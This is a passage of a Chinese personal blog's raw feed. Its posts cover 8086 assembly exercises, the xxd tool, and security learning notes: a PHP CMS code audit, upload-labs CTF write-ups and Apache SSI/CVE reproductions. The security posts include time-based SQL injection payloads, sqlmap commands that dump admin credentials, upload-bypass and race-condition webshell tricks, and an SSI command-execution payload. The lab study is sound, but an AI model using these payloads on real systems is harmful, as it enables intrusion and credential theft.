内存单元pop 内存单元</code></pre><p>利用栈可以达到交换数据的目的</p><pre><code>mov ax,1000Hmov ss,axmov sp,0010Hmov ax,001AHmov bx,001BHpush axpush bxpop axpop bx</code></pre><h2 id="习题"><a href="#习题" class="headerlink" title="习题"></a>习题</h2><h3 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h3><p><img src="/posts/6cc1a5d6/1580653176153.png" alt></p><pre><code class="x86asm">mov ax,1000Hmov ds,axmov ax,2000mov ss,axmov sp,0010Hpush[0]push[2]push[4]push[6]push[8]push[A]push[C]push[E]</code></pre><p>现在 1000H~100FH 的内存内容为：</p><p><img src="/posts/6cc1a5d6/1580653193364.png" alt></p><p>本着节约内存的想法</p><p><img src="/posts/6cc1a5d6/1580653210499.png" alt></p><p>然而执行完之后的结果</p><p><img src="/posts/6cc1a5d6/1580653219446.png" alt></p><p>看来节约内存不是件好事，于是我重新把 3000:0 作为代码段</p><p><img src="/posts/6cc1a5d6/1580653228997.png" alt></p><p>这回成功了</p><p><img src="/posts/6cc1a5d6/1580653238046.png" alt></p><h3 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h3><p><img src="/posts/6cc1a5d6/1580653248493.png" alt></p><pre><code class="x86asm">mov ax,2000Hmov ds,axmov ax,1000Hmov ss,axmov sp,0pop [E]pop [C]pop [A]pop [8]pop [6]pop [4]pop [2]pop [0]</code></pre><p>同样的，我先设置 1000:0 处的值</p><p><img src="/posts/6cc1a5d6/1580653258074.png" alt></p><p>将指令书写到内存中，也就是设置 3000:0 为代码段</p><p><img src="/posts/6cc1a5d6/1580653266322.png" alt></p><p>在实验的时候，前面一部分数据是可以正常复制的，但是后面就出问题了</p><p><img src="/posts/6cc1a5d6/1580653275496.png" alt></p><p>暂时没想清楚</p><h2 id="实验三"><a href="#实验三" class="headerlink" title="实验三"></a>实验三</h2><p>遇到的问题</p><p>输入指令：</p><p><img src="/posts/6cc1a5d6/1580653286041.png" alt></p><p>但是在执行的时候：</p><p><img src="/posts/6cc1a5d6/1580653293057.png" alt></p><p>这是之后要研究的内容；中断机制<br>Debug的T命令在修改寄存器SS的指令时，下一条指令也会紧接着执行</p><pre><code class="x86asm">mov ax,ffffmov ds,axmov ax,2200mov ss,axmov sp,0100mov ax,[0]     ;ax=C0EAHadd ax,[2]     ;ax=C0FCHmov bx,[4]     ;bx=30Fadd bx,[6]     ;bx=6021Hpush ax        ;sp=FEH,修改的内存单元地址是220FEH,内容为C0FCHpush bx        ;sp=FCH,修改的内存单元地址是220FCH,内容为6021Hpop ax           ;sp=FEH,ax=6021Hpop bx           ;sp=100H,bx=C0FCHpush [4]       ;sp=FEH,修改的内存单元是220FEH,内容为30F0push [6]       ;sp=FCH,修改的内存单元是220FCH,内容为2F31</code></pre><p><img src="/posts/6cc1a5d6/1580653302675.png" alt></p><p>为什么2000:0 ~2000:f 的内容会发生变化？</p><p><img src="/posts/6cc1a5d6/1580653314559.png" alt></p><p>仔细观察发现<br>01A3 不知道是什么，但是0b39和0108确实当前指令的地址，也就是执行完 <code>mov ss,ax mov sp,10H</code> 之后的下一条指令的地址，结合这是在设置栈，不禁想到了函数的压栈，保存了返回地址，但是还有一个 0020 的数据不知道是哪里的</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编从入门到入土一</title>
      <link href="/posts/57418b7f/"/>
      <url>/posts/57418b7f/</url>
      
        <content type="html"><![CDATA[<h2 id="第一、二章"><a href="#第一、二章" class="headerlink" title="第一、二章"></a>第一、二章</h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>一个存储单元一般存储 1个字节，也就是8个二进制位</p><p>一个字为两个字节</p><p>地址总线：用来寻址，由于一根地址总线只能表示2个状态，所以一个CPU有N根地址线，则可以说这个CPU的地址总线宽度为N，这样的CPU最多可以寻找 $2^{N}$ 个内存单元</p><p>数据总线：数据总线的宽度意味着CPU一次能传输多少位数据</p><p>控制总线：控制总线的宽度决定了CPU对外部器件的控制能力</p><h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><p>通用寄存器中，AX可以拆分为 AH和AL，如果单独使用AH或者AL，则应该看成一个独立的8位寄存器来使用，AH和AL此时是不相关的</p><p>如何寻址？<br><img src="/posts/57418b7f/1580566042011.png" alt></p><p>注意此时并不是操作系统中学到的分段，只是这么用罢了</p><p>一个 ‘段’ 的偏移占16位，那么一个段的长度最大为64KB</p><p>不同的段地址和偏移地址可以形成同一个物理地址</p><p>CS:IP 指向的内容就是将要执行的指令(但是CPU是怎么知道指令的长度的呢，x86是变长的，而MIPS是等长的，这个坑之后说)</p><p>基础指令 mov,add,jmp</p><p>mov指令设置寄存器的内容值，add执行加法，jmp设置cs和ip的值</p><p>四条指令完成计算2的4次方</p><pre><code class="x86asm">mov ax,2add ax,axadd ax,axadd ax,ax</code></pre><p>当然也可以使用jmp指令，但是你无法判定程序什么时候退出(因为指令不够hhhh)</p><h2 id="dosbox使用"><a href="#dosbox使用" class="headerlink" title="dosbox使用"></a>dosbox使用</h2><p>dosbox可以用来模拟dos环境，然后我们下载一个MASM工具包，里面包含了 <code>debug</code> 这些程序</p><p>注意设置dosbox</p><pre><code>[autoexec]# Lines in this section will be run at startup.# You can put your MOUNT lines here.mount C: G:\MASMC:</code></pre><p>因为我的 MASM 工具包位于 G盘目录下，所以设置挂载命令<br>这样打开dosbox之后自动挂载</p><p><img src="/posts/57418b7f/1580565800214.png" alt></p><h2 id="实验一"><a href="#实验一" class="headerlink" title="实验一"></a>实验一</h2><p>debug.exe 使用<br>r 命令可以查看寄存器内容，以及当前的 cs:ip 指向，还有ds指向的内容</p><p><img src="/posts/57418b7f/1580565809854.png" alt></p><p>还可以修改寄存器的内容</p><p><img src="/posts/57418b7f/1580565820000.png" alt></p><p>使用d命令查看内存</p><p><code>d1000:9</code></p><p><img src="/posts/57418b7f/1580565830704.png" alt></p><p>查看某一个范围内的内存</p><p><code>d1000:9 20</code></p><p><img src="/posts/57418b7f/1580565845701.png" alt></p><p>e 命令可以修改内存的数据</p><p><code>e1000:0 0 1 2 3 4 5 7 8</code></p><p><img src="/posts/57418b7f/1580565854260.png" alt></p><p>当然也可以换一种方式修改</p><p><img src="/posts/57418b7f/1580565864064.png" alt></p><p>也可以向其中写入字符串</p><p><img src="/posts/57418b7f/1580565875753.png" alt></p><p>尝试写入一段汇编指令</p><p><img src="/posts/57418b7f/1580565886857.png" alt></p><p>使用 e命令编辑内存，然后使用 u 命令反汇编</p><p><img src="/posts/57418b7f/1580565897644.png" alt></p><p>那么如何执行汇编指令呢？</p><p>首先用 r 设置 cs 和 ip的值，然后使用 t 就可以执行汇编指令了，可以看到执行了三条汇编指令后的结果， ax 存储了 0x03   cx 存储了 0x02</p><p><img src="/posts/57418b7f/1580565906622.png" alt></p><p>直接使用 e 命令编辑当然不方便，于是可以用 a 命令直接书写汇编指令，然后自动的给转化成对应的机器码</p><p><img src="/posts/57418b7f/1580565914978.png" alt></p><h2 id="实验任务"><a href="#实验任务" class="headerlink" title="实验任务"></a>实验任务</h2><ol><li>使用debug将下面的程序写入内存，逐条执行</li></ol><p><img src="/posts/57418b7f/1580565925422.png" alt></p><p>汇编指令输入到内存中</p><p><img src="/posts/57418b7f/1580565937645.png" alt></p><p>然后运行就是的了</p><ol start="2"><li>将下面3条指令写入到 2000:0 开始的内存单元中，计算2的次方</li></ol><pre><code class="x86asm">mov ax,1add ax,axjmp 2000:0003</code></pre><p>运行过程截图</p><p><img src="/posts/57418b7f/1580565948449.png" alt></p><ol start="3"><li>PC 机主板上的ROM有一个生产日期，在内存 FFF00H~FFFFFH 的某几个单元中，请找到这个生产日期并试图改变它</li></ol><p><img src="/posts/57418b7f/1580565963720.png" alt></p><p>很显然我是改不了的</p><p><img src="/posts/57418b7f/1580565972814.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
            <tag> dosbox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代码审计初尝</title>
      <link href="/posts/728b20a1/"/>
      <url>/posts/728b20a1/</url>
      
        <content type="html"><![CDATA[<h2 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h2><p>文件删除函数只考虑到了白名单路径，但是没有想到 <code>../</code></p><pre><code class="php">function del_file(){    $path = post(&#39;path&#39;);    $path = str_replace(&#39;../&#39;,&#39;&#39;,$path);    $dir[0] = &#39;data/backup/&#39;;    $dir[1] = &#39;images/&#39;;    $dir[2] = &#39;resource/&#39;;    $flag = false;    for($i = 0; $i &lt; count($dir); $i ++)    {        if(substr($path,0,strlen($dir[$i])) == $dir[$i])        {            $flag = true;        }    }    if($flag)    {        if(unlink($path))        {            $result = 1;        }    }    echo isset($result) ? $result : 0;}</code></pre><p>根目录新建 aaaa.txt<br>然后发送请求<br><img src="/posts/728b20a1/1580563907589.png" alt></p><p>成功删除文件</p><h2 id="后台注入"><a href="#后台注入" class="headerlink" title="后台注入"></a>后台注入</h2><h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><p><code>or if(length(database())=6,sleep(3),0)</code><br>如果数据库名的长度为6，那么就 <code>sleep(3)</code><br>我测试的时候数据库名为 <code>xinxiu</code> ，所以就会出现一定的延时</p><p><img src="/posts/728b20a1/1580563920089.png" alt></p><p>延时注入的其他例子</p><pre><code># 判断当前数据库长度 # 当前数据库长度是否为 1 没有延时 不是 cmd=del_admin&amp;id=3 or if(length(database())=1,sleep(3),0) # 延时 表明当前数据库长度为 6 cmd=del_admin&amp;id=3 or if(length(database())=6,sleep(3),0) # 当前数据库第1个字母的ascii码是否为 97 没有延时 不是 cmd=del_admin&amp;id=3 or if(ascii(mid(database(),1,1))=97,sleep(3),0) # 延时 表明当前数据库第1个字母的ascii码为 115 即 &#39;s&#39; cmd=del_admin&amp;id=3 or if(ascii(mid(database(),1,1))=115,sleep(3),0) # 当前数据库第2个字母的ascii码是否为 97 没有延时 不是 cmd=del_admin&amp;id=3 or if(ascii(mid(database(),2,1))=97,sleep(3),0) # 延时 表明当前数据库第2个字母的ascii码为 105 即 &#39;i&#39; cmd=del_admin&amp;id=3 or if(ascii(mid(database(),2,1))=105,sleep(3),0) ...</code></pre><p>注意这里不能用 and ,因为这个 id=3 的用户实际上不存在，所以就不再需要去执行 and 另一边的语句了(短路！)</p><p>但是如果这个用户存在当然是可以的咯(那样注入就很麻烦了)</p><p><img src="/posts/728b20a1/1580563976163.png" alt></p><p>但是我按照国光的方法使用 sqlmap 失败了</p><pre><code>./sqlmap.py -u &quot;http://127.0.0.1/admin.php?/deal/dir-basic/&quot; --cookie=&quot;qaq21129s234bj1q4ammcs7fe5;&quot; --data=&quot;cmd=del_admin&amp;id=3&quot; -p &quot;id&quot; --technique=T --random-agent -v 3 --tamper=&quot;between&quot; -D &#39;sinsiu&#39; -T &#39;php_admin&#39; -C &#39;adm_id,adm_username,adm_password&#39; --dump</code></pre><p><img src="/posts/728b20a1/1580563990735.png" alt></p><h3 id="另一处后台注入"><a href="#另一处后台注入" class="headerlink" title="另一处后台注入"></a>另一处后台注入</h3><p><code>search_main.php</code> 文件</p><pre><code class="php">    $global[&#39;key&#39;] = rawurldecode($global[&#39;key&#39;]);    $obj = new goods();    $obj-&gt;set_field(&#39;goo_id,goo_title,goo_x_img&#39;);    $obj-&gt;set_where(&quot;goo_title like &#39;%&quot; . $global[&#39;key&#39;] . &quot;%&#39;&quot;);    $obj-&gt;set_where(&#39;goo_channel_id = &#39;.get_id(&#39;channel&#39;,&#39;cha_code&#39;,&#39;goods&#39;));</code></pre><p>这里忘记过滤了</p><pre><code class="php">$obj-&gt;set_where(&quot;goo_title like &#39;%&quot; . $global[&#39;key&#39;] . &quot;%&#39;&quot;);</code></pre><p><img src="/posts/728b20a1/1580564002356.png" alt></p><p>同样的尝试使用 <code>sqlmap</code> 但是还是失败了(怕是个假的吧)</p><pre><code> ./sqlmap.py -u &quot;http://localhost/?/search/index.html/key-%27*%20%23/&quot; -v 3 --technique=T -D &#39;sinsiu&#39; -T &#39;php_admin&#39; -C &#39;adm_id,adm_username,adm_password&#39; --dump</code></pre><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p><code>admin/basic_func.php</code> 中：</p><p><code>$global[&#39;channel&#39;]</code> 参数可控，比如访问 <code>/admin.php?/service/mod-user_sheet/</code>,那么获取到的是 <code>service</code> ，之后判断文件是否存在进行包含</p><pre><code class="php">    global $global;    $global = array();    var_dump($_SERVER[&#39;QUERY_STRING&#39;]);    $global[&#39;url&#39;] = $filter($_SERVER[&#39;QUERY_STRING&#39;]);    if($global[&#39;url&#39;] != &#39;&#39;)    {        $arr = explode(&#39;/&#39;,$global[&#39;url&#39;]); //以 / 做分隔符        $global[&#39;channel&#39;] = $arr[1];        var_dump($global);</code></pre><p><img src="/posts/728b20a1/1580564015011.png" alt></p><pre><code class="php">function main(){    global $global,$smarty;    set_global();    include_all(&#39;admin/class&#39;);    set_more_global();    $path = &#39;admin/admin.php&#39;;    if($global[&#39;url&#39;] != &#39;&#39;)    {        $path2 = &#39;admin/&#39;.$global[&#39;channel&#39;].&#39;.php&#39;; //获取到 $global[&#39;channel&#39;] 这个参数可控        var_dump(file_exists($path2));        if(file_exists($path2))        {            $path = $path2;        }    }    include($path);}</code></pre><p>但是这里如果传入 <code>../</code> 那么就会导致 <code>file_exists</code> 返回错误，所以暂时无能为力</p><p><code>admin/common.func.php</code> 文件中</p><pre><code class="php">function run($parameter){    global $smarty;    $path = &#39;&#39;;    $display = &#39;&#39;;    extract($parameter); //extract函数存在变量覆盖，但是参数不可控    $func = &#39;module_&#39;.$module;    include(&#39;admin/module/&#39;.$path.$module.&#39;.php&#39;);    $func($parameter);    if($display != &#39;no&#39;)    {        $smarty-&gt;display(&#39;module/&#39;.$path.$module.&#39;.php&#39;);    }}</code></pre><h2 id="任意写文件"><a href="#任意写文件" class="headerlink" title="任意写文件"></a>任意写文件</h2><p><code>common.func.php</code> 存在一处编辑配置文件</p><p><img src="/posts/728b20a1/1580564028890.png" alt></p><p>当然此处是可以随意修改文件的，只是没办法写shell</p><p><img src="/posts/728b20a1/1580564041634.png" alt></p><p>可见过滤还是挺严格的</p><p><img src="/posts/728b20a1/1580564050184.png" alt></p><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p><code>getRemoteImage.php</code> 文件中，</p><p>可以获取远程图片</p><p>首先必须是 http开头的</p><pre><code class="php">if(strpos($imgUrl,&quot;http&quot;)!==0){                array_push( $tmpNames , &quot;error&quot; );                continue;            }</code></pre><p>校验了后缀名</p><pre><code class="php">            $fileType = strtolower( strrchr( $imgUrl , &#39;.&#39; ) );            if ( !in_array( $fileType , $config[ &#39;allowFiles&#39; ] ) || stristr( $heads[ &#39;Content-Type&#39; ] , &quot;image&quot; ) ) {                array_push( $tmpNames , &quot;error&quot; );                continue;            }</code></pre><p>相关的白名单</p><pre><code class="php">    $config = array(        &quot;savePath&quot; =&gt; &quot;../../images/editor/&quot; ,            //保存路径        &quot;allowFiles&quot; =&gt; array( &quot;.gif&quot; , &quot;.png&quot; , &quot;.jpg&quot; , &quot;.jpeg&quot; , &quot;.bmp&quot; ) , //文件允许格式        &quot;maxSize&quot; =&gt; 30000                    //文件大小限制，单位KB    );</code></pre><p>之后会读取文件</p><pre><code class="php">readfile( $imgUrl,false,$context);</code></pre><p>这么看来感觉问题不大</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.sqlsec.com/2020/01/sinsiu.html#toc-heading-21" target="_blank" rel="noopener">PHP代码审计初尝</a></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cms </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>每天一个Linux命令-xxd</title>
      <link href="/posts/2e8d4a2a/"/>
      <url>/posts/2e8d4a2a/</url>
      
        <content type="html"><![CDATA[<h2 id="xxd"><a href="#xxd" class="headerlink" title="xxd"></a>xxd</h2><p>基本选项</p><ul><li>-a : 它的作用是自动跳过空白内容，默认是关闭的</li><li>-c : 它的后面加上数字表示每行显示多少字节的十六进制数，默认是16字节。</li><li>-g : 设定以几个字节为一块，默认为2字节。</li><li>-l : 显示多少字节的内容。</li><li>-s : 后面接【+-】和address.加号表示从地址处开始的内容，减号表示距末尾address开始的内容。</li><li>-ps: output in postscript plain hexdump style</li></ul><p>xxd 是有单位的，如</p><p><img src="/posts/2e8d4a2a/1580557821863.png" alt></p><p>和</p><p><img src="/posts/2e8d4a2a/1580557833258.png" alt></p><p>很显然其中一个 0x100 是 256个字节，也就是16行咯</p><h3 id="g-选项的含义"><a href="#g-选项的含义" class="headerlink" title="-g 选项的含义"></a>-g 选项的含义</h3><p>默认是两个字节一组</p><pre><code class="bash">$ xxd -s -100 -l 0x20 monster.jpg00002601: eeae ee33 b2ae ae9b b979 0eb8 e171 a040  ...3.....y...q.@00002611: 2146 78f7 d5a0 fef0 79e7 5135 fbf5 7f48  !Fx.....y.Q5...H</code></pre><p>通过 -g 变为一个字节一组</p><pre><code class="bash">$ xxd -s -100 -l 0x20  -g 1 monster.jpg 00002601: ee ae ee 33 b2 ae ae 9b b9 79 0e b8 e1 71 a0 40  ...3.....y...q.@00002611: 21 46 78 f7 d5 a0 fe f0 79 e7 51 35 fb f5 7f 48  !Fx.....y.Q5...H</code></pre><h2 id="其他用法"><a href="#其他用法" class="headerlink" title="其他用法"></a>其他用法</h2><p>如果我只想要十六进制,加上 -ps 选项</p><pre><code class="bash">$ xxd -s -100 -l 0x20  -g 1  -ps monster.jpg eeaeee33b2aeae9bb9790eb8e171a040214678f7d5a0fef079e75135fbf57f48</code></pre><p>​    可以输出C语言数组形式</p><pre><code class="bash">$ xxd -s -100 -l 0x20  -g 1 -i  monster.jpg unsigned char monster_jpg[] = {  0xee, 0xae, 0xee, 0x33, 0xb2, 0xae, 0xae, 0x9b, 0xb9, 0x79, 0x0e, 0xb8,  0xe1, 0x71, 0xa0, 0x40, 0x21, 0x46, 0x78, 0xf7, 0xd5, 0xa0, 0xfe, 0xf0,  0x79, 0xe7, 0x51, 0x35, 0xfb, 0xf5, 0x7f, 0x48};unsigned int monster_jpg_len = 32;</code></pre><h2 id="与vim结合"><a href="#与vim结合" class="headerlink" title="与vim结合"></a>与vim结合</h2><p><code>vim 文件名 -b</code> 以二进制方式打开文件</p><p>然后输入命令 <code>%!xxd</code></p><p>就可以进入到十六进制编辑模式</p><p>编辑完之后需要用 <code>%!xxd -r</code> 保存，退回到原来的vim模式</p><h2 id="反向dump"><a href="#反向dump" class="headerlink" title="反向dump"></a>反向dump</h2><pre><code class="bash"># pxy @ LAPTOP-UBIEP4K5$ xxd monster.jpg file.dump# pxy @ LAPTOP-UBIEP4K5$ head -n 4 file.dump 00000000: ffd8 ffe0 0010 4a46 4946 0001 0100 0001  ......JFIF......00000010: 0001 0000 ffdb 0043 0008 0606 0706 0508  .......C........00000020: 0707 0709 0908 0a0c 140d 0c0b 0b0c 1912  ................00000030: 130f 141d 1a1f 1e1d 1a1c 1c20 242e 2720  ........... $.&#39;# pxy @ LAPTOP-UBIEP4K5 $ xxd -r file.dump &gt; a.jpg# pxy @ LAPTOP-UBIEP4K5 $ file a.jpg a.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 160x247, components 3</code></pre><p>这样比较方便，可以转成其他文件，进行编辑之后再转回来，本质上和vim一起用的效果一样</p><p>​        </p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xxd </tag>
            
            <tag> hexdump </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>每天以一道leetcode-链表题</title>
      <link href="/posts/2e6a5f8a/"/>
      <url>/posts/2e6a5f8a/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>safeharbor靶机渗透</title>
      <link href="/posts/1f38a4f2/"/>
      <url>/posts/1f38a4f2/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>upload-lab做题笔记</title>
      <link href="/posts/5877398d/"/>
      <url>/posts/5877398d/</url>
      
        <content type="html"><![CDATA[<h2 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h2><p>这个算是逻辑漏洞了<br>reset 函数重置当前指针， end指向最后一个元素，这个最后并不是指最后的，而是最后加入数组的元素</p><pre><code class="php">php &gt; $a = array(1,2,3,4,5);php &gt; current($a);php &gt; echo current($a);1php &gt; echo next($a);2php &gt; echo current($a);2php &gt; echo end($a);5php &gt; echo current($a);5php &gt; echo reset($a);1php &gt; echo current($a);</code></pre><p>于是这样就可以理解了</p><p><img src="/posts/5877398d/1580398124587.png" alt></p><p>关键就在于用户可以控制这个文件名</p><pre><code class="php">$file = empty($_POST[&#39;save_name&#39;]) ? $_FILES[&#39;upload_file&#39;][&#39;name&#39;] : $_POST[&#39;save_name&#39;];if (!is_array($file)) {    $file = explode(&#39;.&#39;, strtolower($file));}var_dump($file);$ext = end($file);var_dump($ext);$allow_suffix = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);if (!in_array($ext, $allow_suffix)) {    $msg = &quot;禁止上传该后缀文件!&quot;;}else{    $file_name = reset($file) . &#39;.&#39; . $file[count($file) - 1];    $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];    $img_path = UPLOAD_PATH . &#39;/&#39; .$file_name;    if (move_uploaded_file($temp_file, $img_path)) {        $msg = &quot;文件上传成功！&quot;;        $is_upload = true;    } else {</code></pre><p>同时也要熟悉文件上传的数据包，复习了一遍 POST 方式传递数组同时可以规定元素的顺序</p><h2 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h2><p>CVE-2015-2348 利用即可</p><p><img src="/posts/5877398d/1580398163615.png" alt></p><h2 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h2><p>这一关代码很多，最后没想到是通过条件竞争来达到目的</p><p>但是由于限制了后缀名，参考了很多博客都是利用 apache 解析漏洞</p><p><img src="/posts/5877398d/1580564170919.png" alt></p><h2 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h2><p>也是一个条件竞争的，关键代码:</p><pre><code class="php">    if(move_uploaded_file($temp_file, $upload_file)){        if(in_array($file_ext,$ext_arr)){             $img_path = UPLOAD_PATH . &#39;/&#39;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;             rename($upload_file, $img_path);             $is_upload = true;        }else{            $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;            unlink($upload_file);</code></pre><p>我们上传一个 <code>shell.php</code><br>内容为：</p><pre><code class="php">&lt;?php file_put_contents(&quot;info.php&quot;, &quot;&lt;?php phpinfo(); ?&gt;&quot;)?&gt;</code></pre><p>之后去访问这个文件，就能生成 info.php</p><p><img src="/posts/5877398d/1580564183356.png" alt></p><p>还有一种方式先上传 <code>shell.php:.jpg</code> 绕过限制</p><p><img src="/posts/5877398d/1580564192098.png" alt></p><p>这样会生成 <code>shell.php</code> 的空文件，然后利用Windows的特性,尽管上传的文件被删除了，但是依旧覆盖了原有的文件</p><p><img src="/posts/5877398d/1580564202994.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php常用函数</title>
      <link href="/posts/3d16ce36/"/>
      <url>/posts/3d16ce36/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> 函数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞复现-Apache SSI远程命令执行</title>
      <link href="/posts/becfc22d/"/>
      <url>/posts/becfc22d/</url>
      
        <content type="html"><![CDATA[<h2 id="SSI远程命令执行"><a href="#SSI远程命令执行" class="headerlink" title="SSI远程命令执行"></a>SSI远程命令执行</h2><p>当目标服务器开启了SSI与CGI支持,我们就可以上传shtml,利用 <code>&lt;!--#exec cmd=”id” --&gt;</code> 语法执行命令。</p><blockquote><p>shtml 不是 html 而是一种服务器 API,shtml 是服务器动态产生的 htm<br>使用SSI(Server Side Include)的html文件扩展名，SSI（Server Side Include)，通常称为”服务器端嵌入”或者叫”服务器端包含”，是一种类似于ASP的基于服务器的网页制作技术。默认扩展名是 .stm、.shtm 和 .shtml。</p></blockquote><p><img src="/posts/becfc22d/1580369820917.png" alt></p><p>上传之后，点击即可</p><p><img src="/posts/becfc22d/1580369831464.png" alt></p><p>可以尝试上传 shtml 文件来达到getshell的目的</p><p><img src="/posts/becfc22d/1580369842405.png" alt></p><h2 id="CVE-2017-15715-换行符截断"><a href="#CVE-2017-15715-换行符截断" class="headerlink" title="CVE-2017-15715 换行符截断"></a>CVE-2017-15715 换行符截断</h2><p>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，1.php\x0A<br>将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p><p>发送文件上传数据包</p><p><img src="/posts/becfc22d/1580371055451.png" alt></p><p>需要添加一个 <code>\x0a</code></p><p><img src="/posts/becfc22d/1580371064625.png" alt></p><p>上传后解析成功</p><p><img src="/posts/becfc22d/1580371072709.png" alt></p><p>ps:也不知道如何构造文件上传数据包，我是写了一个表单来完成的,然后将相关的参数做一些修改即可</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;http://192.168.99.100:8080/index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>环境中处理文件上传的代码:</p><pre><code class="php">&lt;?phpif(isset($_FILES[&#39;file&#39;])) {    $name = basename($_POST[&#39;name&#39;]);    $ext = pathinfo($name,PATHINFO_EXTENSION);    if(in_array($ext, [&#39;php&#39;, &#39;php3&#39;, &#39;php4&#39;, &#39;php5&#39;, &#39;phtml&#39;, &#39;pht&#39;])) {        exit(&#39;bad file&#39;);    }    move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], &#39;./&#39; . $name);</code></pre><h2 id="CVE-2015-2348-php任意文件上传"><a href="#CVE-2015-2348-php任意文件上传" class="headerlink" title="CVE-2015-2348 php任意文件上传"></a>CVE-2015-2348 php任意文件上传</h2><p>漏洞影响版本必须在5.4.x&lt;= 5.4.39, 5.5.x&lt;= 5.5.23, 5.6.x &lt;= 5.6.7，详见CVE公告：<a href="https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-2348" target="_blank" rel="noopener">https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-2348</a><br>这个漏洞的利用条件比较苛刻，尝试用 php5.5.9 nts 测试没有成功<br>并且测试的时候发现</p><p><img src="/posts/becfc22d/1580397902588.png" alt></p><p>尽管加上了 \x00 但是实际上通过</p><pre><code class="php">$uploaded_name = $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ];var_dump($uploaded_name);</code></pre><p>获取到的文件名并不会包含 <code>.jpg</code><br>这里就涉及到数据的获取问题了</p><p>文件上传的数据包可以分成这几个部分：</p><p><img src="/posts/becfc22d/1580397931674.png" alt></p><p>第一部分是会存储到 <code>$_FILES</code> 数字中，并且 <code>name</code> 是用来和后端交互的， <code>filename</code> 是固定的一个名字，后端通过 <code>$_FILES[&#39;file&#39;][&#39;name&#39;]</code> 来得到<br>第二部分的数据是存储到 <code>$_POST</code> 和 <code>$_REQUEST</code> 数组中的</p><p><img src="/posts/becfc22d/1580397942131.png" alt></p><p>既然如此，那我就直接写死 <code>$target_path .= &quot;aaa.php\x00.jpg&quot;;</code> 即可进行测试</p><p> php 5.2.17 可以</p><p><img src="/posts/becfc22d/1580397968376.png" alt></p><p>php5.5.9 也可以</p><p><img src="/posts/becfc22d/1580397984801.png" alt></p><p>如果换成 php 7.3.4 nts 、5.3.29、5.4.45、5.6.9则报错</p><p><img src="/posts/becfc22d/1580397995259.png" alt></p><h3 id="漏洞原因："><a href="#漏洞原因：" class="headerlink" title="漏洞原因："></a>漏洞原因：</h3><p>php在5.6.6中将长度比较的安全检查逻辑给去掉了</p><p><img src="/posts/becfc22d/1580398009005.png" alt></p><p>原来有安全检查的代码是这样子的：</p><p><img src="/posts/becfc22d/1580398026408.png" alt></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/cyjaysun/p/4390930.html" target="_blank" rel="noopener">https://www.cnblogs.com/cyjaysun/p/4390930.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
